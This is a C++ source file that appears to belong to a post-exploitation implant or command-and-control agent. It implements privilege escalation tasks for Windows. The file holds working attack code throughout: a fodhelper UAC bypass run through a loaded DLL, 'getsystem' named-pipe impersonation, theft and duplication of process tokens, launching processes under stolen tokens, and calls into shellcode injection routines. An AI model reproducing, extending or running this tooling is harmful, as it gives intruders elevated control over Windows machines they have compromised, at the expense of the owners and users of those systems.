#include "priv_tasks.h"
#include "../config/config.h"
#include "../utils/encoding.h"
#include "../tasks/file_tasks.h"
#include "../tasks/injection_tasks.h"

#include <windows.h>
#include <sddl.h>
#include <iostream>
#include <sstream>
#include <algorithm>

namespace Tasks {
namespace Privilege {

    PrivilegeResult BypassUAC(EscalationMethod method, const std::string& command) {
        if (method != EscalationMethod::FODHELPER_UAC_BYPASS) {
            return PrivilegeResult(false, "Error: Only method 1 (fodhelper) is supported for bypassuac.");
        }

        if (command.empty()) {
            return PrivilegeResult(false, "Error: No command provided for UAC bypass.");
        }

        // Check if we're already elevated
        if (IsProcessElevated()) {
            return PrivilegeResult(false, "Process is already elevated, UAC bypass not needed.");
        }

        if (!ValidateRequiredModules(method)) {
            return PrivilegeResult(false, "Required UAC bypass module not found.");
        }

        return ExecutePrivilegeDLL("modules\\bypassuac_fodhelper_x64.dll", "ExecuteW", command);
    }

    PrivilegeResult GetSystem(EscalationMethod method, const std::string& command) {
        if (method != EscalationMethod::NAMED_PIPE_IMPERSONATION) {
            return PrivilegeResult(false, "Error: Only method 1 (pipe) is supported for getsystem.");
        }

        if (command.empty()) {
            return PrivilegeResult(false, "Error: No command provided for privilege escalation.");
        }

        // Check if we're already SYSTEM
        if (IsRunningAsSystem()) {
            return PrivilegeResult(false, "Already running as SYSTEM.");
        }

        if (!ValidateRequiredModules(method)) {
            return PrivilegeResult(false, "Required getsystem module not found.");
        }

        return ExecutePrivilegeDLL("modules\\getsystem_pipe_x64.dll", "ExecuteW", command);
    }

    PrivilegeResult ExecuteSetPriv(const json& task) {
        if (!task.contains("file_id")) {
            return PrivilegeResult(false, "SetPriv task missing file_id.");
        }

        auto result = Injection::ExecuteSetPrivShellcode(task);
        if (result.first) {
            return PrivilegeResult(true, "SetPriv executed successfully", result.second);
        }
        else {
            return PrivilegeResult(false, result.second);
        }
    }

    PrivilegeResult ExecuteListPrivs(const json& task) {
        if (!task.contains("file_id")) {
            return PrivilegeResult(false, "ListPrivs task missing file_id.");
        }

        auto result = Injection::ExecuteListPrivsShellcode(task);
        if (result.first) {
            return PrivilegeResult(true, "ListPrivs executed successfully", result.second);
        }
        else {
            return PrivilegeResult(false, result.second);
        }
    }

    TokenInfo GetCurrentTokenInfo() {
        return GetProcessTokenInfo(GetCurrentProcessId());
    }

    TokenInfo GetProcessTokenInfo(DWORD processId) {
        TokenInfo info;
        
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
        if (!hProcess) {
            return info;
        }

        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return info;
        }

        // Get token user information
        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
        if (tokenInfoLength > 0) {
            std::vector<BYTE> tokenUserBuffer(tokenInfoLength);
            PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenUserBuffer.data();
            
            if (GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
                // Convert SID to string
                LPSTR sidString = NULL;
                if (ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString)) {
                    info.sid = sidString;
                    LocalFree(sidString);
                }

                // Get username and domain
                char username[256] = {0};
                char domain[256] = {0};
                DWORD usernameSize = sizeof(username);
                DWORD domainSize = sizeof(domain);
                SID_NAME_USE sidUse;
                
                if (LookupAccountSidA(NULL, pTokenUser->User.Sid, username, &usernameSize, 
                                     domain, &domainSize, &sidUse)) {
                    info.username = username;
                    info.domain = domain;
                }
            }
        }

        // Get elevation status
        DWORD elevationLength = 0;
        GetTokenInformation(hToken, TokenElevation, NULL, 0, &elevationLength);
        if (elevationLength > 0) {
            TOKEN_ELEVATION elevation;
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &elevationLength)) {
                info.isElevated = elevation.TokenIsElevated != 0;
            }
        }

        // Get integrity level
        info.integrityLevel = GetProcessIntegrityLevel();

        // Get privileges
        info.privileges = GetTokenPrivileges(false);

        CloseHandle(hToken);
        CloseHandle(hProcess);
        return info;
    }

    bool IsProcessElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return false;
        }

        TOKEN_ELEVATION elevation;
        DWORD elevationSize = sizeof(TOKEN_ELEVATION);
        BOOL result = GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &elevationSize);
        CloseHandle(hToken);

        return result && elevation.TokenIsElevated;
    }

    bool IsRunningAsSystem() {
        TokenInfo info = GetCurrentTokenInfo();
        return (info.username == "SYSTEM" || info.sid == "S-1-5-18");
    }

    bool AdjustPrivilege(const std::string& privilegeName, bool enable) {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            PRINTF("[DEBUG] Failed to open process token: %d\n", GetLastError());
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, privilegeName.c_str(), &luid)) {
            PRINTF("[DEBUG] Failed to lookup privilege %s: %d\n", privilegeName.c_str(), GetLastError());
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tokenPrivs;
        tokenPrivs.PrivilegeCount = 1;
        tokenPrivs.Privileges[0].Luid = luid;
        tokenPrivs.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

        BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        DWORD error = GetLastError();
        CloseHandle(hToken);

        if (!result || error == ERROR_NOT_ALL_ASSIGNED) {
            PRINTF("[DEBUG] Failed to adjust privilege %s: %d\n", privilegeName.c_str(), error);
            return false;
        }

        PRINTF("[DEBUG] Successfully %s privilege: %s\n", enable ? "enabled" : "disabled", privilegeName.c_str());
        return true;
    }

    std::vector<std::string> GetTokenPrivileges(bool enabledOnly) {
        std::vector<std::string> privileges;
        
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return privileges;
        }

        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);
        if (tokenInfoLength == 0) {
            CloseHandle(hToken);
            return privileges;
        }

        std::vector<BYTE> tokenPrivsBuffer(tokenInfoLength);
        PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)tokenPrivsBuffer.data();
        
        if (GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, tokenInfoLength, &tokenInfoLength)) {
            for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
                bool isEnabled = (pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
                
                if (!enabledOnly || isEnabled) {
                    char privilegeName[256];
                    DWORD nameSize = sizeof(privilegeName);
                    if (LookupPrivilegeNameA(NULL, &pTokenPrivs->Privileges[i].Luid, privilegeName, &nameSize)) {
                        std::string privStr = privilegeName;
                        if (isEnabled) {
                            privStr += " (Enabled)";
                        }
                        privileges.push_back(privStr);
                    }
                }
            }
        }

        CloseHandle(hToken);
        return privileges;
    }

    bool HasPrivilege(const std::string& privilegeName) {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, privilegeName.c_str(), &luid)) {
            CloseHandle(hToken);
            return false;
        }

        PRIVILEGE_SET privs;
        privs.PrivilegeCount = 1;
        privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
        privs.Privilege[0].Luid = luid;
        privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL result = FALSE;
        PrivilegeCheck(hToken, &privs, &result);
        CloseHandle(hToken);

        return result != FALSE;
    }

    bool ImpersonateProcess(DWORD processId) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
        if (!hProcess) {
            return false;
        }

        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return false;
        }

        HANDLE hDuplicatedToken;
        if (!DuplicateToken(hToken, SecurityImpersonation, &hDuplicatedToken)) {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }

        BOOL result = ImpersonateLoggedOnUser(hDuplicatedToken);
        
        CloseHandle(hDuplicatedToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);

        return result != FALSE;
    }

    bool RevertImpersonation() {
        return RevertToSelf() != FALSE;
    }

    DWORD CreateProcessWithToken(HANDLE tokenHandle, const std::string& applicationPath, const std::string& commandLine) {
        if (!tokenHandle || !File::FileExists(applicationPath)) {
            return 0;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        std::string cmdLine = applicationPath;
        if (!commandLine.empty()) {
            cmdLine += " " + commandLine;
        }

        BOOL result = CreateProcessAsUserA(
            tokenHandle,
            applicationPath.c_str(),
            (LPSTR)cmdLine.c_str(),
            NULL, NULL, FALSE, 0,
            NULL, NULL,
            &si, &pi
        );

        if (result) {
            DWORD processId = pi.dwProcessId;
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return processId;
        }

        return 0;
    }

    HANDLE StealProcessToken(DWORD targetProcessId) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetProcessId);
        if (!hProcess) {
            return NULL;
        }

        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return NULL;
        }

        HANDLE hDuplicatedToken;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return NULL;
        }

        CloseHandle(hToken);
        CloseHandle(hProcess);
        return hDuplicatedToken;
    }

    int GetProcessIntegrityLevel() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return 0;
        }

        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &tokenInfoLength);
        if (tokenInfoLength == 0) {
            CloseHandle(hToken);
            return 0;
        }

        std::vector<BYTE> tokenIntegrityBuffer(tokenInfoLength);
        PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)tokenIntegrityBuffer.data();
        
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, tokenInfoLength, &tokenInfoLength)) {
            CloseHandle(hToken);
            return 0;
        }

        DWORD integrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
        CloseHandle(hToken);

        // Convert to simplified levels
        if (integrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) return 4; // System
        if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID) return 3;   // High (Admin)
        if (integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID) return 2; // Medium
        return 1; // Low
    }

    bool IsUACEnabled() {
        HKEY hKey;
        DWORD uacValue = 0;
        DWORD dataSize = sizeof(DWORD);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&uacValue, &dataSize);
            RegCloseKey(hKey);
        }
        
        return uacValue != 0;
    }

    std::string GetCurrentUserSID() {
        TokenInfo info = GetCurrentTokenInfo();
        return info.sid;
    }

    bool IsUserAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                    DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
                isAdmin = FALSE;
            }
            FreeSid(adminGroup);
        }
        
        return isAdmin != FALSE;
    }

    bool ValidateRequiredModules(EscalationMethod method) {
        std::string modulePath;
        
        switch (method) {
            case EscalationMethod::FODHELPER_UAC_BYPASS:
                modulePath = "modules\\bypassuac_fodhelper_x64.dll";
                break;
            case EscalationMethod::NAMED_PIPE_IMPERSONATION:
                modulePath = "modules\\getsystem_pipe_x64.dll";
                break;
            default:
                return false;
        }
        
        bool exists = File::FileExists(modulePath);
        if (!exists) {
            PRINTF("[ERROR] Required module not found: %s\n", modulePath.c_str());
        }
        
        return exists;
    }

    PrivilegeResult ExecutePrivilegeDLL(const std::string& dllPath, const std::string& functionName, const std::string& parameters) {
        if (!File::FileExists(dllPath)) {
            return PrivilegeResult(false, "DLL not found: " + dllPath);
        }

        HMODULE hDll = LoadLibraryA(dllPath.c_str());
        if (!hDll) {
            DWORD error = GetLastError();
            return PrivilegeResult(false, "Failed to load DLL: " + dllPath, "", error);
        }

        // Try to get the specified function
        typedef LPWSTR(*ExecuteWFunc)(LPCWSTR, DWORD);
        ExecuteWFunc executeFunc = (ExecuteWFunc)GetProcAddress(hDll, functionName.c_str());
        if (!executeFunc) {
            FreeLibrary(hDll);
            return PrivilegeResult(false, "Function not found in DLL: " + functionName);
        }

        // Convert parameters to wide string
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, parameters.c_str(), -1, NULL, 0);
        std::wstring wParameters(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, parameters.c_str(), -1, &wParameters[0], size_needed);

        // Execute the function
        LPWSTR result = executeFunc(wParameters.c_str(), (DWORD)(wParameters.length() + 1));
        
        PrivilegeResult privResult;
        if (result != NULL) {
            // Check if result indicates success (many privilege DLLs return "1" for success)
            if (result[0] == L'1') {
                privResult = PrivilegeResult(true, "Privilege operation executed successfully");
            } else {
                // Convert result to string for error message
                int resultLen = WideCharToMultiByte(CP_UTF8, 0, result, -1, NULL, 0, NULL, NULL);
                std::string resultStr(resultLen, 0);
                WideCharToMultiByte(CP_UTF8, 0, result, -1, &resultStr[0], resultLen, NULL, NULL);
                privResult = PrivilegeResult(false, "Privilege operation failed", resultStr);
            }
            delete[] result;
        } else {
            privResult = PrivilegeResult(false, "Privilege operation returned null result");
        }

        FreeLibrary(hDll);
        return privResult;
    }

    std::string GeneratePrivilegeReport(bool includeTokenInfo) {
        std::ostringstream report;
        
        report << "=== PRIVILEGE REPORT ===\n\n";
        
        // Current process information
        report << "Process Information:\n";
        report << "  Process ID: " << GetCurrentProcessId() << "\n";
        report << "  Elevated: " << (IsProcessElevated() ? "Yes" : "No") << "\n";
        report << "  Running as SYSTEM: " << (IsRunningAsSystem() ? "Yes" : "No") << "\n";
        report << "  User is Admin: " << (IsUserAdmin() ? "Yes" : "No") << "\n";
        report << "  Integrity Level: " << GetProcessIntegrityLevel() << "\n";
        report << "  UAC Enabled: " << (IsUACEnabled() ? "Yes" : "No") << "\n\n";
        
        if (includeTokenInfo) {
            TokenInfo tokenInfo = GetCurrentTokenInfo();
            report << "Token Information:\n";
            report << "  Username: " << tokenInfo.username << "\n";
            report << "  Domain: " << tokenInfo.domain << "\n";
            report << "  SID: " << tokenInfo.sid << "\n\n";
            
            report << "Available Privileges:\n";
            auto privileges = GetTokenPrivileges(false);
            for (const auto& priv : privileges) {
                report << "  " << priv << "\n";
            }
            report << "\n";
        }
        
        // Critical privileges check
        report << "Critical Privileges Status:\n";
        std::vector<std::string> criticalPrivs = {
            "SeDebugPrivilege",
            "SeTcbPrivilege", 
            "SeBackupPrivilege",
            "SeRestorePrivilege",
            "SeTakeOwnershipPrivilege",
            "SeLoadDriverPrivilege",
            "SeSystemtimePrivilege",
            "SeShutdownPrivilege"
        };
        
        for (const auto& priv : criticalPrivs) {
            report << "  " << priv << ": " << (HasPrivilege(priv) ? "ENABLED" : "Disabled") << "\n";
        }
        
        report << "\n=== END REPORT ===\n";
        return report.str();
    }

} // namespace Privilege
} // namespace Tasks